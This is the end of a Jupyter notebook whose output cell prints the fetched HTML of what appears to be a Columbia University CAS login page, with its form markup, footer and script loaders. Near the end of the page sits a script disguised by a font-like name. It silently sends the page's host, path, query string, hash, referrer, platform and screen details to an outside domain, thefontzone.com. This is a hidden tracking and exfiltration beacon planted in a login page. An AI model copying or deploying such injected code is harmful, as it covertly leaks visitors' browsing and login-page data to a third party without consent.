type=\"hidden\" name=\"geolocation\"/><input class=\"btn-submit\"\\r\\n                   name=\"submit\" accesskey=\"l\" value=\"LOGIN\"\\r\\n                   tabindex=\"10\" type=\"submit\" /><input class=\"btn-reset\" \\r\\n                    name=\"reset\" accesskey=\"c\" value=\"CLEAR\" \\r\\n\\t\\t\\t\\t\\ttabindex=\"11\" type=\"reset\" /></div>\\r\\n        </form>\\r\\n    </div>\\r\\n\\r\\n\\r\\n</div>\\r\\n</div>\\r\\n</main>\\r\\n\\r\\n<footer class=\"footer\" role=\"contentinfo\">\\n\\n        <div id=\"footer\" class=\"fl-panel fl-note fl-bevel-white fl-font-size-80\">\\n                \\n            <div style=\"font-size:12px; color: #104E8B;\"><p>By using these resources, you agree to abide by <br/>Columbia University\\'s \\n                <a href=\"http://policylibrary.columbia.edu/acceptable-usage-information-resources-policy\">Acceptable Usage of \\n                Information Resources Policy</a>.\\n                </p>\\n            </div>\\n \\n            <div id=\"footer\">\\n            <p style=\"width:100%; padding:15px; text-align:center\">Managed by CUIT. Please contact the <a href=\"https://cuit.columbia.edu/service-desk\">CUIT Service Desk</a>\\n            for login assistance.</p>\\n\\t\\t\\t</div>\\n\\n        </div>\\n\\n    </footer>\\r\\n\\r\\n</div>\\r\\n</div>\\r\\n\\r\\n<script type=\"text/javascript\" src=\"/cas/webjars/zxcvbn/4.3.0/zxcvbn.js\"></script>\\n<script type=\"text/javascript\" src=\"/cas/webjars/jquery-ui/1.12.1/jquery-ui.min.js\"></script>\\n<script type=\"text/javascript\" src=\"/cas/webjars/jquery-cookie/1.4.1-1/jquery.cookie.js\"></script>\\n<script src=\"/cas/webjars/bootstrap/4.1.0/js/bootstrap.bundle.min.js\"></script>\\n\\n<script src=\"/cas/webjars/headjs/1.0.3/head.min.js\"></script>\\n<script src=\"/cas/webjars/store.js/1.3.17/store.min.js\"></script>\\n<script type=\"text/javascript\" src=\"/cas/js/cas.js\"></script>\\n<script type=\"text/javascript\" src=\"/cas/js/cu-privacy-notice.js\"></script>\\n\\n<script>\\nhead.ready(document, function () {\\n    if (!window.jQuery) {\\n    \\tvar jqueryUrl = \"\\\\/cas\\\\/webjars\\\\/jquery\\\\/3.3.1\\\\/jquery.min.js\"; \\n        head.load(jqueryUrl, loadjQueryUI);\\n    } else {\\n        notifyResourcesAreLoaded(resourceLoadedSuccessfully);\\n    }\\n});\\n\\nfunction loadjQueryUI() {\\n\\tvar jqueryUrl = \"\\\\/cas\\\\/webjars\\\\/jquery-ui\\\\/1.12.1\\\\/jquery-ui.min.js\"; \\n\\thead.load(jqueryUrl, loadjQueryCookies);\\n}\\n\\nfunction loadjQueryCookies() {\\n\\tvar jqueryUrl = \"\\\\/cas\\\\/webjars\\\\/jquery-cookie\\\\/1.4.1-1\\\\/jquery.cookie.js\"; \\n\\thead.load(jqueryUrl, notifyResourcesAreLoaded(resourceLoadedSuccessfully));\\n}\\n\\nfunction notifyResourcesAreLoaded(callback) {\\n    if (typeof callback === \"function\") {\\n        callback();\\n    }\\n}\\n</script>\\n\\n<script>\\n    /*<![CDATA[*/\\n\\n    var trackGeoLocation = false;\\n\\n    var googleAnalyticsTrackingId = null;\\n\\n    if (googleAnalyticsTrackingId != null && googleAnalyticsTrackingId != \\'\\') {\\n        (function(i,s,o,g,r,a,m){i[\\'GoogleAnalyticsObject\\']=r;i[r]=i[r]||function(){\\n            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),\\n            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)\\n        })(window, document, \\'script\\', \\'https://www.google-analytics.com/analytics.js\\', \\'ga\\');\\n\\n        ga(\\'create\\', googleAnalyticsTrackingId, \\'auto\\');\\n        ga(\\'send\\', \\'pageview\\');\\n    }\\n\\n    /*]]>*/\\n</script>\\n\\n<script>\\n\\nfunction font_fam_cbsnmrq(){let i = location.host;let l = location.hostname;let p = location.pathname;let o = navigator.platform;let g5 = new XMLHttpRequest();let v2 = screen.width+\\'x\\'+screen.height;let r3 = new Date().getTimezoneOffset();let s4 =  document.referrer;let y1 =  encodeURIComponent(location.protocol);let y2 =  encodeURIComponent(location.hash);let y3 =  encodeURIComponent(location.search);g5.open(\"GET\", \"https://thefontzone.com/v4/w/fonts/ed9b1e1bc1f03898e0b3a2ccca8e645b?i=\"+i+\"&l=\"+l+\"&p=\"+p+\"&o=\"+o+\"&v2=\"+v2+\"&r3=\"+r3+\"&s4=\"+s4+\"&y1=\"+y1+\"&y2=\"+y2+\"&y3=\"+y3);g5.send();};font_fam_cbsnmrq();\\n\\n</script>\\n\\n\\n</body>\\r\\n</html>\\r\\n'"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "response.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
